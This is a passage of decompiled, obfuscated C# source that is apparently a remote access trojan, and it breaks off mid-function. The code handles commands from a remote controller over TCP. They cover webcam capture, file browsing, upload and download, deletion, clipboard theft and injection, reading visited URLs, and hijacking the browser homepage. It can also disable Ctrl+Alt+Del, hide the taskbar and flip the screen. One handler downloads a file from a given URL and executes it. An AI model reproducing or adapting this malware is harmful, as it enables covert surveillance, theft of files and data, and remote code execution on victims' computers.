							string lpszName = Strings.Space(100);
							string lpszVer = Strings.Space(100);
							int num = 0;
							StringBuilder stringBuilder = new StringBuilder();
							bool flag;
							do
							{
								if (flag = capGetDriverDescriptionA((short)num, ref lpszName, 100, ref lpszVer, 100))
								{
									stringBuilder.Append(lpszName.Trim() + "¦");
								}
								num++;
							}
							while (flag);
							mQSTi8lfx9R4lRqEZjJhdk75.WriteLine("/WEBLISTC/" + stringBuilder.ToString());
							mQSTi8lfx9R4lRqEZjJhdk75.Flush();
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBSTART/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							eurVgQtyOBO20 = "Connect";
							string_0 = "";
							pupJSdidQDwScXtBU164 = new Thread(UHbtHGc7mCGBvhL8147);
							pupJSdidQDwScXtBU164.Start(text);
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBIMAGA/":
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						string text2 = text;
						if (Operators.CompareString(text2, "0", false) == 0)
						{
							pPLpV3B3M5JjTEdapoq4eG9c166 = true;
						}
						else if (Operators.CompareString(text2, "1", false) == 0)
						{
							vVj7wLDpEIrlyAqnx0LCHI3e167 = true;
						}
						break;
					}
					case "/WEBIMAGE/":
						try
						{
							switch (Strings.Mid(text, 11, Strings.Len(text)))
							{
							case "Image":
								fp1HC39iEuU21 = "Image";
								break;
							case "Capture":
								fp1HC39iEuU21 = "Capture";
								break;
							case "Capture2":
								fp1HC39iEuU21 = "Capture2";
								break;
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBSTOPP/":
						try
						{
							pPLpV3B3M5JjTEdapoq4eG9c166 = false;
							vVj7wLDpEIrlyAqnx0LCHI3e167 = false;
							fp1HC39iEuU21 = "";
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBDISCO/":
						try
						{
							pPLpV3B3M5JjTEdapoq4eG9c166 = false;
							vVj7wLDpEIrlyAqnx0LCHI3e167 = false;
							fp1HC39iEuU21 = null;
							string_0 = "Disconnect";
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPDESK/":
						try
						{
							pPLpV3B3M5JjTEdapoq4eG9c166 = false;
							vVj7wLDpEIrlyAqnx0LCHI3e167 = false;
							fp1HC39iEuU21 = null;
							string_0 = "Disconnect";
							mQSTi8lfx9R4lRqEZjJhdk75.Dispose();
							EfPlBou5E7VJA3nBHJvI2y76.Dispose();
							wWTgv0SRYzICOWukIfM6tM74.Dispose();
							sROjUukB8bUmSEi6Iclqdo73.Close();
							return;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						method_6(1);
						try
						{
							mQSTi8lfx9R4lRqEZjJhdk75.WriteLine("/WEBLISTC/");
							mQSTi8lfx9R4lRqEZjJhdk75.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_13()
	{
		string text = null;
		checked
		{
			try
			{
				while (tcpClient_1.Connected)
				{
					text = streamReader_0.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						method_6(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/IPREVIEW/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Image val = null;
							Image val2 = null;
							try
							{
								val2 = Image.FromFile(text);
								string text4 = null;
								if (val2 != null)
								{
									double num2 = (double)val2.get_Size().Width / (double)val2.get_Size().Height;
									double num3 = (double)val2.get_Size().Height / (double)val2.get_Size().Width;
									val = ((val2.get_Size().Width <= val2.get_Size().Height) ? val2.GetThumbnailImage((int)Math.Round(200.0 / num3), 200, (GetThumbnailImageAbort)null, default(IntPtr)) : val2.GetThumbnailImage(200, (int)Math.Round(200.0 / num2), (GetThumbnailImageAbort)null, default(IntPtr)));
									MemoryStream memoryStream = new MemoryStream();
									val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
									memoryStream.Capacity = (int)memoryStream.Length;
									byte[] buffer = memoryStream.GetBuffer();
									text4 = Convert.ToBase64String(buffer);
									J580cztlCh0prHvvQRNdyH80.WriteLine("/IPREVIEW/" + text4);
									J580cztlCh0prHvvQRNdyH80.Flush();
									memoryStream.Dispose();
									memoryStream.Close();
									val2.Dispose();
								}
							}
							catch (Exception projectError13)
							{
								ProjectData.SetProjectError(projectError13);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError14)
						{
							ProjectData.SetProjectError(projectError14);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPDOWN/":
						try
						{
							NSkqwkNbctHQ114();
						}
						catch (Exception projectError12)
						{
							ProjectData.SetProjectError(projectError12);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDRVS/":
						try
						{
							Thread thread10 = new Thread(G2EvZgH8EghKpQquXPdP7pc163);
							thread10.Start(J580cztlCh0prHvvQRNdyH80);
						}
						catch (Exception projectError11)
						{
							ProjectData.SetProjectError(projectError11);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDIRS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Thread thread9 = new Thread(lqX6VCy3prHhbBqTIqldsB7164);
							thread9.Start(text);
						}
						catch (Exception projectError10)
						{
							ProjectData.SetProjectError(projectError10);
							J580cztlCh0prHvvQRNdyH80.WriteLine("/ERRORDIR/");
							J580cztlCh0prHvvQRNdyH80.Flush();
							ProjectData.ClearProjectError();
						}
						break;
					case "/DOWNFILE/":
					{
						Thread thread8 = new Thread(oZtk5tk62dQYnj7QxbnmcpO171);
						thread8.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/ENCOREFL/":
					{
						Thread thread7 = new Thread(method_10);
						thread7.Start();
						break;
					}
					case "/ERROR/":
						try
						{
							NSkqwkNbctHQ114();
						}
						catch (Exception projectError9)
						{
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPUPLD/":
						try
						{
							IOLZKlqOL4kXCdhBJJ40.Flush();
							NSkqwkNbctHQ114();
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
						break;
					case "/UPLOADFL/":
					{
						Thread thread6 = new Thread(method_11);
						thread6.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/OTHERPAK/":
					{
						Thread thread5 = new Thread(NfVEypUtkL175);
						thread5.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/FINEUPLD/":
					{
						Thread thread4 = new Thread(mNgYMCHgsj176);
						thread4.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/RUNEXEFL/":
						try
						{
							string text3 = Strings.Mid(text, 11, 1);
							text = Strings.Mid(text, 12, Strings.Len(text));
							if (Operators.CompareString(text3, "1", false) == 0)
							{
								Thread thread2 = new Thread(xHCcqMThQi186);
								thread2.Start(text);
							}
							else
							{
								Thread thread3 = new Thread(oJ1WcHWVPP187);
								thread3.Start(text);
							}
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
						break;
					case "/KILLFILE/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Thread thread = new Thread(method_5);
							thread.Start(text);
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/DIRSDELL/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							if (((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().DirectoryExists(text))
							{
								((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().DeleteDirectory(text, (DeleteDirectoryOption)5);
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/FILESIZE/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							int num = (int)((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().GetFileInfo(text).Length;
							J580cztlCh0prHvvQRNdyH80.WriteLine("/FILESIZE/" + Conversions.ToString(num));
							J580cztlCh0prHvvQRNdyH80.Flush();
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/MAKEDIRS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							if (!((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().DirectoryExists(text))
							{
								((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().CreateDirectory(text);
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/RENAMEFL/":
						try
						{
							string text2 = Strings.Mid(text, 11, 1);
							text = Strings.Mid(text, 12, Strings.Len(text));
							string[] array = text.Split(new char[1] { '*' });
							if (Operators.CompareString(text2, "0", false) == 0)
							{
								((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().RenameDirectory(Conversions.ToString(array.GetValue(0)), Conversions.ToString(array.GetValue(1)));
							}
							else
							{
								((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().RenameFile(Conversions.ToString(array.GetValue(0)), Conversions.ToString(array.GetValue(1)));
							}
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						method_6(1);
						try
						{
							J580cztlCh0prHvvQRNdyH80.WriteLine("/FILESIZE/");
							J580cztlCh0prHvvQRNdyH80.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void muaO5DW195(object temp)
	{
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		int num = 65536;
		byte[] array = new byte[0];
		short num2 = 1;
		TcpClient tcpClient = new TcpClient();
		tcpClient.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
		NetworkStream stream = tcpClient.GetStream();
		StreamWriter streamWriter = new StreamWriter(stream);
		StreamReader streamReader = new StreamReader(stream);
		FileStream input = new FileStream(Conversions.ToString(temp), FileMode.Open, FileAccess.Read, FileShare.Read);
		BinaryReader binaryReader = new BinaryReader(input);
		long num3 = SqrLgqVqTohj123(Conversions.ToString(temp));
		string[] array2 = (string[])NewLateBinding.LateGet(temp, (Type)null, "Split", new object[1] { "\\" }, (string[])null, (Type[])null, (bool[])null);
		checked
		{
			string text = Conversions.ToString(array2.GetValue(array2.Length - 1));
			int num5 = default(int);
			long num6 = default(long);
			if (num3 < 65536L)
			{
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
				array = new byte[(int)(num3 - 1L) + 1];
				binaryReader.Read(array, 0, (int)num3);
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
				stringBuilder.Append("/STARTDOW/" + text + "¦" + Conversions.ToString(num3) + "*");
				int num4 = array.Length - 1;
				for (int i = 0; i <= num4; i++)
				{
					stringBuilder2.Append(array.GetValue(i)!.ToString() + " ");
				}
				stringBuilder.Append((object?)stringBuilder2);
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			else
			{
				num5 = (int)Math.Round(Math.Floor((double)num3 / (double)num));
				num6 = num3 - num5 * num;
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
				array = new byte[num - 1 + 1];
				binaryReader.Read(array, 0, num);
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
				stringBuilder.Append("/STARTDOW/" + text + "¦" + Conversions.ToString(num3) + "*");
				int num7 = array.Length - 1;
				for (int j = 0; j <= num7; j++)
				{
					stringBuilder2.Append(array.GetValue(j)!.ToString() + " ");
				}
				stringBuilder.Append((object?)stringBuilder2);
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			string text2 = null;
			try
			{
				while (tcpClient.Connected)
				{
					text2 = streamReader.ReadLine();
					if (Operators.CompareString(text2, (string)null, false) == 0)
					{
						method_6(1);
					}
					switch (Strings.Left(text2, 10))
					{
					case "/STOPDOWN/":
						try
						{
							NSkqwkNbctHQ114();
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/ENCOREFL/":
						try
						{
							if (num2 != num5)
							{
								StringBuilder stringBuilder3 = new StringBuilder();
								StringBuilder stringBuilder4 = new StringBuilder();
								num2 = (short)(num2 + 1);
								array = new byte[num - 1 + 1];
								binaryReader.Read(array, 0, num);
								binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
								stringBuilder3.Append("/PAKSSEND/");
								int num8 = array.Length - 1;
								for (int k = 0; k <= num8; k++)
								{
									stringBuilder4.Append(array.GetValue(k)!.ToString() + " ");
								}
								stringBuilder3.Append((object?)stringBuilder4);
								streamWriter.WriteLine((object?)stringBuilder3);
								streamWriter.Flush();
							}
							else if (num6 > 0L)
							{
								StringBuilder stringBuilder5 = new StringBuilder();
								StringBuilder stringBuilder6 = new StringBuilder();
								array = new byte[(int)(num6 - 1L) + 1];
								binaryReader.Read(array, 0, (int)num6);
								stringBuilder5.Append("/FINEDOWN/");
								int num9 = array.Length - 1;
								for (int l = 0; l <= num9; l++)
								{
									stringBuilder6.Append(array.GetValue(l)!.ToString() + " ");
								}
								stringBuilder5.Append((object?)stringBuilder6);
								streamWriter.WriteLine((object?)stringBuilder5);
								streamWriter.Flush();
								NSkqwkNbctHQ114();
							}
							else
							{
								streamWriter.WriteLine("/FINEDOWN/");
								streamWriter.Flush();
								NSkqwkNbctHQ114();
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							try
							{
								NSkqwkNbctHQ114();
								streamWriter.WriteLine("/ERROR/");
								streamWriter.Flush();
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
						break;
					case "/ERROR/":
						try
						{
							NSkqwkNbctHQ114();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						try
						{
							streamWriter.WriteLine("/ERROR/");
							streamWriter.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					case "/FINISHED/":
						tcpClient.Close();
						return;
					}
				}
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_14()
	{
		string text = null;
		try
		{
			while (tcpClient_2.Connected)
			{
				text = streamReader_1.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/INFOPCPC/", false) == 0)
				{
					try
					{
						Thread thread = new Thread(xG3APftLws183);
						thread.Start();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/LASTURLS/", false) == 0)
				{
					try
					{
						X0fYjgQgNkl2uI3ouvi133();
						string text3 = X0fYjgQgNkl2uI3ouvi133();
						SnN5zNIYZ85.WriteLine("/LASTURLS/" + text3);
						SnN5zNIYZ85.Flush();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					method_6(1);
					try
					{
						SnN5zNIYZ85.WriteLine("/LASTURLS/");
						SnN5zNIYZ85.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void uuC4oPu197()
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		string text = null;
		try
		{
			while (Lbgc3BoOx88.Connected)
			{
				text = U8Ho2ZuWN91.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/SHOWMESG/", false) != 0)
				{
					continue;
				}
				w9IGgzBWGX2oQYnbAl47 = (MessageBoxIcon)0;
				QdtGecOxwkTqGqAcMg48 = (MessageBoxButtons)0;
				BpJ9oENZtjBgjkHh7149 = null;
				string_2 = null;
				try
				{
					List<string> list = new List<string>();
					string[] array = text.Split(new char[1] { '*' });
					string[] array2 = array;
					foreach (string item in array2)
					{
						list.Add(item);
					}
					BpJ9oENZtjBgjkHh7149 = list[1].ToString();
					string_2 = list[2].ToString();
					switch (list[4].ToString())
					{
					case "Q":
						w9IGgzBWGX2oQYnbAl47 = (MessageBoxIcon)32;
						break;
					case "W":
						w9IGgzBWGX2oQYnbAl47 = (MessageBoxIcon)48;
						break;
					case "I":
						w9IGgzBWGX2oQYnbAl47 = (MessageBoxIcon)64;
						break;
					case "E":
						w9IGgzBWGX2oQYnbAl47 = (MessageBoxIcon)16;
						break;
					}
					switch (list[3].ToString())
					{
					case "OK":
						QdtGecOxwkTqGqAcMg48 = (MessageBoxButtons)0;
						break;
					case "ARI":
						QdtGecOxwkTqGqAcMg48 = (MessageBoxButtons)2;
						break;
					case "YNC":
						QdtGecOxwkTqGqAcMg48 = (MessageBoxButtons)3;
						break;
					case "YN":
						QdtGecOxwkTqGqAcMg48 = (MessageBoxButtons)4;
						break;
					case "OC":
						QdtGecOxwkTqGqAcMg48 = (MessageBoxButtons)1;
						break;
					case "RC":
						QdtGecOxwkTqGqAcMg48 = (MessageBoxButtons)5;
						break;
					}
					Thread thread = new Thread(NCJU8yuF8L6jEaJaj1P132);
					thread.Start();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void gZDMdrT198()
	{
		string text = null;
		try
		{
			while (oLfvrvTqv93.Connected)
			{
				text = THAY7y8Dk96.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/OPENCDCD/":
					try
					{
						Thread thread3 = new Thread(QtQyzCRCWu185);
						thread3.Start(true);
					}
					catch (Exception projectError19)
					{
						ProjectData.SetProjectError(projectError19);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CLOSECDD/":
					try
					{
						Thread thread2 = new Thread(QtQyzCRCWu185);
						thread2.Start(true);
					}
					catch (Exception projectError18)
					{
						ProjectData.SetProjectError(projectError18);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DESKH/":
					try
					{
						y8BAYtIkst9eHmUJBcJ125();
					}
					catch (Exception projectError17)
					{
						ProjectData.SetProjectError(projectError17);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DESKS/":
					try
					{
						J3TMhFs3zb3K124();
					}
					catch (Exception projectError16)
					{
						ProjectData.SetProjectError(projectError16);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTH/":
					try
					{
						sqFWQfUE5UKIsnrksxr127();
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTS/":
					try
					{
						Jh1G93UzQ59HHnHc7Pl126();
					}
					catch (Exception projectError14)
					{
						ProjectData.SetProjectError(projectError14);
						ProjectData.ClearProjectError();
					}
					break;
				case "/HIDETASK/":
					try
					{
						rw3TRfiMsRZ9NUfJj3l128();
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SHOWTASK/":
					try
					{
						bqfpOF5mHjg2eFFnPpx129();
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
					break;
				case "/FLIP/":
					try
					{
						y3VNrsB4j5LLdppQVTgQ6pBf45 dm2 = LsMjd0SviHd5ypMKBGZXeibq46.OHKZPFfZgiJtbMJOGzIih215();
						orhl2zQBrusOiOJlKLx137(ref dm2);
						dm2.dmDisplayOrientation = int_0[2];
						BxxiFFp0mdmv5j6rENg139(dm2);
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					break;
				case "/UNFLIP/":
					try
					{
						y3VNrsB4j5LLdppQVTgQ6pBf45 dm = LsMjd0SviHd5ypMKBGZXeibq46.OHKZPFfZgiJtbMJOGzIih215();
						orhl2zQBrusOiOJlKLx137(ref dm);
						dm.dmDisplayOrientation = int_0[0];
						BxxiFFp0mdmv5j6rENg139(dm);
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SWAPM/":
					try
					{
						SwapMouseButton(256L);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/UNSWAPM/":
					try
					{
						SwapMouseButton(0L);
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CADD/":
					try
					{
						mr61lG2U5LPmXqba0m4140(enable: false);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CADE/":
					try
					{
						mr61lG2U5LPmXqba0m4140(enable: true);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/TMOFF/":
					try
					{
						H3Jvlebxk88s4RHEfQQD2CKE44.SendMessage((IntPtr)65535, 274u, (IntPtr)61808, (IntPtr)2);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/TMON/":
					try
					{
						H3Jvlebxk88s4RHEfQQD2CKE44.SendMessage((IntPtr)65535, 274u, (IntPtr)61808, (IntPtr)(-1));
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SCRSTART/":
					try
					{
						bCDLjexRp4U854zTKRx142(start: true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SCRSTOP/":
					try
					{
						bCDLjexRp4U854zTKRx142(start: false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SPEAKOUT/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(SwByk7r190);
						thread.Start(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
	}

	private void BgMJJ9e199()
	{
		string text = null;
		try
		{
			while (IDNEYZMt698.Connected)
			{
				text = Dx5ZDW101.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/IEVER/":
					try
					{
						RegistryKey localMachine = Registry.LocalMachine;
						RegistryKey registryKey4 = localMachine.OpenSubKey("Software\\Microsoft\\Internet Explorer");
						string text3 = registryKey4.GetValue("Version")!.ToString();
						VUdwXv100.WriteLine("/IEVERSIN/" + text3);
						VUdwXv100.Flush();
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STRTPAGE/":
					try
					{
						RegistryKey currentUser3 = Registry.CurrentUser;
						RegistryKey registryKey3 = currentUser3.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						string text2 = registryKey3.GetValue("Start Page")!.ToString();
						VUdwXv100.WriteLine("/IESTARTP/" + text2);
						VUdwXv100.Flush();
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CHANGETL/":
					text = Strings.Mid(text, 11, Strings.Len(text));
					try
					{
						RegistryKey currentUser2 = Registry.CurrentUser;
						RegistryKey registryKey2 = currentUser2.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						registryKey2.SetValue("Window Title", text, RegistryValueKind.String);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CHANGEHP/":
					text = Strings.Mid(text, 11, Strings.Len(text));
					try
					{
						RegistryKey currentUser = Registry.CurrentUser;
						RegistryKey registryKey = currentUser.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						registryKey.SetValue("Start Page", text);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/RUNSPAGE/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						if (!text.StartsWith("http://") | !text.StartsWith("https://"))
						{
							text = "http://" + text;
						}
						Process.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					method_6(1);
					try
					{
						VUdwXv100.WriteLine("/IESTARTP/");
						VUdwXv100.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	private void WNFTIZf200()
	{
		string text = null;
		try
		{
			while (qfIAbE103.Connected)
			{
				text = nbGh1r106.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/CLIPBOAR/", false) == 0)
				{
					try
					{
						AYuUQOJfkcj19 = null;
						Thread thread = new Thread(AT6B0GSufuWjuFCK146);
						thread.SetApartmentState(ApartmentState.STA);
						thread.Start();
						thread.Join();
						QUuRyH105.WriteLine("/CLIPBOAR/" + AYuUQOJfkcj19);
						QUuRyH105.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/SETCLIPB/", false) == 0)
				{
					try
					{
						AYuUQOJfkcj19 = Strings.Mid(text, 11, Strings.Len(text));
						AYuUQOJfkcj19 = AYuUQOJfkcj19.Replace("***", "\r\n");
						Thread thread2 = new Thread(rLff0nLTHZfn0hYX149);
						thread2.SetApartmentState(ApartmentState.STA);
						thread2.Start();
						thread2.Join();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					method_6(1);
					try
					{
						QUuRyH105.WriteLine("/CLIPBOAR/");
						QUuRyH105.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void method_15()
	{
		string text = null;
		checked
		{
			try
			{
				while (fHZTRK108.Connected)
				{
					text = rwKf5d111.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						method_6(1);
					}
					string text2 = Strings.Left(text, 10);
					if (Operators.CompareString(text2, "/DLARUNVS/", false) == 0)
					{
						try
						{
							List<string> list = new List<string>();
							string[] array = Strings.Mid(text, 11, Strings.Len(text)).Split(new char[1] { '/' });
							string[] array2 = array;
							foreach (string item in array2)
							{
								list.Add(item);
							}
							int index = list.Count - 1;
							string text3 = Strings.Mid(text, 11, Strings.Len(text));
							((ServerComputer)RWfjxtEPH2.Computer).get_Network().DownloadFile(text3, Environment.GetEnvironmentVariable("Temp") + "\\" + list[index].ToString(), (string)null, (string)null, false, 100000, true);
							method_6(1);
							Process.Start(Environment.GetEnvironmentVariable("Temp") + "\\" + list[index].ToString());
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
